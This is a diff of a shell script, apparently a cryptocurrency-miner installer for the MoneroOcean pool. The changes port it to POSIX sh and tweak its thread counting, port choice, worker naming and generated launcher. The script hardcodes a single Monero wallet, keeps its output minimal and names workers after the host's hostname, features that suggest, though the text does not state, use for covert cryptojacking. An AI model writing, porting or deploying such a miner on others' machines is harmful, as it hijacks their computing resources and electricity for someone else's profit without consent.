@@ -1,5 +1,5 @@
-#!/bin/bash
-# mfeederr.sh — MoneroOcean miner setup (minimal output, hardcoded wallet)
+#!/bin/sh
+# mfeederr.sh — MoneroOcean miner setup (POSIX sh, minimal output, hardcoded wallet)
 set -u
 
 WALLET="86d9KS12AnJTAVCbQcsw7G5e18ETxxVgAYyzM5d1yxxtAQXAAeAUoD6Sithghh7ookT3GNnkDX276GCRyNpPn9M4Nv2M44B"
@@ -33,11 +33,22 @@ WBASE="${WALLET%%.*}"
 { [ "${#WBASE}" = 95 ] || [ "${#WBASE}" = 106 ]; } || fail "bad wallet length ${#WBASE}"
 
 # --- port ---
-CPU_THREADS=$(nproc 2>/dev/null || echo 1)
+if have nproc; then
+  CPU_THREADS=$(nproc 2>/dev/null || echo 1)
+else
+  CPU_THREADS=$(grep -c ^processor /proc/cpuinfo 2>/dev/null || echo 1)
+fi
+[ -z "$CPU_THREADS" ] && CPU_THREADS=1
+
 EXP=$(( CPU_THREADS * 700 / 1000 )); [ "$EXP" -lt 1 ] && EXP=1
+
 power2() {
   if have bc; then echo "x=l($1)/l(2); scale=0; 2^((x+0.5)/1)" | bc -l
-  else local n=$1 p=1; while [ "$p" -lt "$n" ]; do p=$((p*2)); done; echo "$p"; fi
+  else
+    n=$1; p=1
+    while [ "$p" -lt "$n" ]; do p=$((p*2)); done
+    echo "$p"
+  fi
 }
 PORT=$(( EXP * 30 )); [ "$PORT" -eq 0 ] && PORT=1
 PORT=$(( 10000 + $(power2 "$PORT") ))
@@ -72,8 +83,9 @@ if ! "$BIN" --help >/dev/null 2>&1; then
 fi
 
 # --- worker id ---
-PASS=$(hostname 2>/dev/null | cut -f1 -d"." | sed -r 's/[^a-zA-Z0-9\-]+/_/g')
-[ -z "$PASS" ] || [ "$PASS" = "localhost" ] && PASS="kdfeederr"
+PASS=$(hostname 2>/dev/null | cut -f1 -d"." | sed -E 's/[^a-zA-Z0-9-]+/_/g')
+[ -z "$PASS" ] && PASS="kdfeederr"
+[ "$PASS" = "localhost" ] && PASS="kdfeederr"
 [ -n "$EMAIL" ] && PASS="$PASS:$EMAIL"
 
 # --- config ---
@@ -133,7 +145,7 @@ fi
 
 # --- miner.sh ---
 cat > "$DIR/miner.sh" <<EOF
-#!/bin/bash
+#!/bin/sh
 if ! pidof $BIN_NAME >/dev/null; then
   nice $BIN "\$@"
 else
